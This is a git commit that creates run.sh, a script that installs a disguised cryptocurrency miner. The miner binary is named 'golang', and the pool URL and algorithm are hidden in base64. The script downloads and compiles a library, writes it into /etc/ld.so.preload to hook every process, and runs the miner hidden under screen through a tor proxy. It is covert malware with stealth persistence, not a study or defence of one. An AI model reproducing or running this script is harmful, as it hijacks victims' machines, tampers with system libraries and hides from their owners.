39ba578a22c0067ece95f523b7845e0aa4eb560f
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-10 13:33:15 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+
+golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
+libgolang=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c
+
+hostname=$(hostname)
+userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY."$hostname
+string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
+key=ZXRoYXNo
+
+seed=$(echo $string | base64 --decode)
+apikey=$(echo $key | base64 --decode)
+
+sudo apt-get install -y libpci-dev gcc screen tor
+
+nohup tor &>/dev/null &
+
+wget $libgolang
+wget $golang
+
+gcc -Wall -fPIC -shared -o libgolang.so libgolang.c -ldl
+sudo mv libgolang.so /usr/local/lib/
+echo /usr/local/lib/libgolang.so >> /etc/ld.so.preload
+
+chmod 777 golang
+
+screen -S "golang" ./golang -a $apikey --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
